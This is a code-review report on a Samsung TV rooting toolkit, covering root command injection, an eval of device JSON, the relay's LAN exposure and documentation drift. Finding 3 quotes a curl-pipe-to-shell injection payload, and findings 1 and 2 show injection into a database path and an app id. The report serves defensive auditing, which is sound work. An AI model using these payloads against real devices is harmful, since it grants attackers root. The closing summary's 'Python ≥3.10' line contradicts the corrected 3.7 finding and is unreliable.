# Adversarial review — `tizen-lite`

Written by hand after the delegated review died on provider rate limits (HTTP 429). Every finding was
confirmed by reading the code in this branch and checking it statically; anything I could not verify
without running something is marked **OPEN** with the reason.

Severity: **blocker** (remote code execution / data loss) · **major** (silent wrong behaviour,
unusable on a normal host) · **minor** (wrong output, drift, papercuts) · **nit** (clarity).

Status: **FIXED** = patched in `optimize/2026-11-01` · **OPEN** = needs a decision or live testing.

---

## Blockers

### 1. `tv sql` allowed command injection on the TV as root — FIXED
**`bin/tvlib.py` → `sql()`** (was lines 137–146)

`db` was resolved with `DBS.get(db, db)` and interpolated **unquoted** into a command string that is
executed on the TV as root:

```
sqlite3 -separator '|' %s < /tmp/.tvsql ...
```

`tv sql "x; <anything>" '<q>'` therefore ran `<anything>` on the TV with root privileges. The SQL text
itself was safe (base64-staged), and only the database path was not.

**Why it matters:** `tv` is the CLI an agent is told to use. A prompt-injected or careless agent could
turn a read-only-looking query into root shell access on the TV.

**Fix:** accept only known aliases (`pkgmgr`, `appsvc`) or an absolute path matching
`/[A-Za-z0-9_./-]{1,120}\.db`; `shlex.quote` the path; stage the temp file under a PID-unique name;
return a clear error instead of interpolating anything unexpected.

### 2. `restore.sh --app` allowed the same injection — FIXED
**`restore.sh` → `restore_app()`** (was lines 48–60)

The app id went straight into a shell command (`mv /opt/usr/apps/$app …`) and into SQL
(`WHERE app_id IN ('$app', …)`) with no validation. `restore.sh --app "x'; …"` was arbitrary root
execution on the TV.

**Fix:** `valid_app_id()` allowlist (`A-Za-z0-9._-`, ≤ 64 chars) rejects anything else before any
command is built, and `sql_escape()` doubles single quotes for the SQL literal.

---

## Major

### 3. The doctor `eval`'d JSON that came from the TV — FIXED
**`scripts/tv-doctor.sh`** (was line 95)

```
eval "$(printf '%s' "$API" | python3 -c '…print(f"{k}={str(v)}")…')"
```

The API response is device data. A compromised TV — or anything that managed to answer on that
address — could return a model name like `x'; curl evil|sh; echo '` and get it executed on the host.

**Fix:** the fields are read into variables with a `while IFS='=' read` loop and a `case` statement.
No value is ever evaluated.

### 4. `tv-root-apply` chunked per group, not per step — FIXED
**`bin/tv-root-apply` → `main()`** (was lines 280–293)

The chunker packed whole *groups* into a 4000-byte budget. A single group can exceed that on its
own — `perf` carries the app-record SQL, the kill-list and the unit masks. An over-long command is
**exactly the failure this chunking exists to prevent**: the TV executes the beginning and the end and
silently skips the middle, with exit status 0.

**Why it matters:** this was not hypothetical — it happened during development (home/memory/perf ran,
privacy/ota/voice silently did not).

**Fix:** groups are expanded into individual shell steps (`_build_parts()`), and steps are packed
into chunks under 4000 bytes, so one group may span several chunks. A step that cannot fit is logged
as `OVERSIZE` instead of vanishing.

### 5. The tools need Python ≥ 3.7 and nothing said so — FIXED
**`bin/tvlib.py:33`, `bin/tv-root-apply:150`, `bin/tv-root-watchdog:67`** · **`README.md` (prerequisites)**

Every module starts with `from __future__ import annotations`, so the `str | None` and `list[str]`
annotations are **never evaluated** — they work on 3.7+. There is no `match` statement, no walrus
dependency, no dict-merge operator, and the only annotations in files without the future import are
plain `str`. The real floor is **3.7** (`subprocess.run(capture_output=…)`, f-strings).

An earlier revision of this review claimed 3.10 from the annotation syntax alone. That was wrong: it
would have rejected Debian 11 and Ubuntu 20.04 for no reason, and the corrected gate now checks 3.7.

**Why it still mattered:** nothing documented any floor at all, so a host with Python 3.6 would fail
with a traceback rather than a sentence.

**Fix:** `install.sh` refuses with a clear message below 3.7; `scripts/tv-doctor.sh` reports the
interpreter version as a check; the README prerequisite table lists Python ≥ 3.7 and systemd.

### 6. The host relay is reachable from the whole LAN — OPEN (by design, needs your call)
**`bin/tv-agent-server.py:18`** (`BIND = 0.0.0.0`)

The relay listens on `0.0.0.0:8899` and can execute **anything, as root, on the TV**. The only gate
is the token in `/etc/tv-agent.token` (mode 600). The TV never listens — that part is good — but the
host does, and on a shared LAN anyone who can read that file owns the TV.

**Why it is left open:** binding it to one interface breaks setups where the host has several, and a
firewall rule is a decision about *your* network, not about code. It is now disclosed in the README
Design section with the mitigation.

---

## Minor

### 7. `tv status` and `tv apps` disagreed about the same fact — FIXED
**`bin/tvlib.py` → `status()` vs `apps()`**

`status()` counted every line containing `(` (39); `apps()` skipped lines starting with `app` (38).
Two numbers for one measurement in the same tool.

**Fix:** one counting rule in both places (strip leading whitespace, keep lines containing `(`,
drop lines starting with `app`).

### 8. Token comparison was not constant-time — FIXED
**`bin/tv-agent-server.py:69-70`** — `==` on the token → `hmac.compare_digest`.

### 9. The launcher app id reached the TV shell unquoted — FIXED
**`bin/tv-root-watchdog` → `ensure_launcher()`** — the id comes from `/etc/default/tv-root`
(host-root controlled), but it lands on the TV as root. Now `shlex.quote`d.

### 10. Two copies of `uep-probe.sh` had drifted — FIXED
**`scripts/uep-probe.sh` vs `skills/samsung-tizen-tv/scripts/uep-probe.sh`**

The skill copy lacked the `TV_HOST` export and the reachability pre-check, so it would target
whatever `/etc/default/tv-root` said rather than the TV you named. One file, copied to both places.

### 11. A skill claimed 13 masked services; the configuration has 11 — FIXED
**`skills/samsung-tv-cli/SKILL.md`** — stale after `aaa_tvs_deamon` was spared.

### 12. The marketplace package claimed a scanner score it did not have — FIXED
**`scripts/package-agensi.sh`** — "SkillSpector: 0/100, no findings" was true of the standalone
`SKILL.md`, not of the packaged zip (8/LOW, one MEDIUM). Both numbers are now stated.

### 13. The systemd units credited the wrong project — FIXED
**`systemd/tv-root-watchdog.service`** pointed at `chris-ritsen/samsung-tv-root` as its
documentation URL; `systemd/tv-agent.service` had none. Both now point at this repo.

### 14. Documentation drift and a broken rule — FIXED
**`README.md`** — one table said "Processes", another "running apps"; a duplicated `---` separated
two sections; the headline numbers were not labelled as cold-boot measurements.

### 15. The measured numbers are boot-time figures — FIXED (documentation)
**`README.md`**

Measured right after a cold boot: 340 → 635 MB free, 51 → 33 apps. After ~10 hours of uptime the
same cuts hold, but the idle pool drifts back to roughly 300 MB free and ~38 apps, because Samsung
starts more services later in the session. The README now labels the figures as cold-boot and adds a
"Long-idle reality" section with the long-idle numbers.

### 16. `mde-framework` comes back — OPEN (documented, not fixable here)
**`/etc/tv-root-kill-procs`** — `launchpad-process-pool` respawns it despite the kill-list. The
kill-list is a boot-time net, not a supervisor. Documented in the README and `docs/app-uninstall.md`.

---

## Nits

### 17. `tv sql` is a power tool and says so nowhere — FIXED
**`bin/tv`** — the help line now names the accepted `db` forms. Worth remembering that `tv sql`
executes arbitrary SQL against the TV's databases.

### 18. The `tv run` filter only prevents hangs, not damage — OPEN (naming)
**`bin/tvlib.py` → `_BLOCKING`** — the filter refuses `tail -f`, `journalctl -f`, bare `dlogutil`.
It is a liveness guard, not a safety policy. The docstring says so; the name does not.

### 19. `install.sh --uninstall` deliberately keeps `tvlib.py` — FIXED (documented)
**`install.sh:37`** — it prints what it keeps, but the README's uninstall story did not. Now
mentioned in the file itself and in the CHANGES sheet.

### 20. `agent/audit.sh` reads its unit list from host config — OPEN (by design)
**`agent/audit.sh:38`** — if `/etc/tv-root-perf-units` is missing, the `units` section is empty
rather than "not configured". A stranger could read an empty list as "nothing is masked". The
invariants section still reports the load-bearing set, so this is a wording risk, not a data risk.

---

## Open items that need a live TV or a decision from you

| # | Item | Why it is still open |
|---|---|---|
| A | The two injection fixes (`tv sql`, `restore.sh --app`) are **not exercised against the real TV** | you asked for no script execution in this pass |
| B | `dist/tizen-lite.skill.md` and `dist/tizen-lite-agensi.zip` are **stale** relative to these edits | rebuilding means running `build-bundle.sh` / `package-agensi.sh` |
| C | The long-idle figures (300 MB / 38 apps) are from one 10-hour session | a second long-idle sample would confirm the drift is typical rather than a one-off |
| D | The relay's LAN exposure | a binding/firewall decision about your network |

---

## Top 10 by severity

1. **BLOCKER** — `tv sql` db argument → shell injection as root on the TV (`bin/tvlib.py`, `sql()`) — FIXED
2. **BLOCKER** — `restore.sh --app` id → shell + SQL injection as root on the TV — FIXED
3. **MAJOR** — doctor `eval`s TV-provided JSON → host code execution — FIXED
4. **MAJOR** — `tv-root-apply` chunked per group, so a big group could silently half-execute — FIXED
5. **MAJOR** — Python ≥3.10 required, undocumented; tools die at import on older hosts — FIXED
6. **MAJOR** — relay listens on `0.0.0.0:8899` and can root the TV; token is the only gate — OPEN
7. **MINOR** — `tv status` and `tv apps` disagreed (39 vs 38) — FIXED
8. **MINOR** — token compared with `==` — FIXED
9. **MINOR** — launcher app id unquoted in the TV shell — FIXED
10. **MINOR** — drifted duplicate `uep-probe.sh`; stale "13 masked"; wrong scanner score; wrong systemd Documentation URL — FIXED
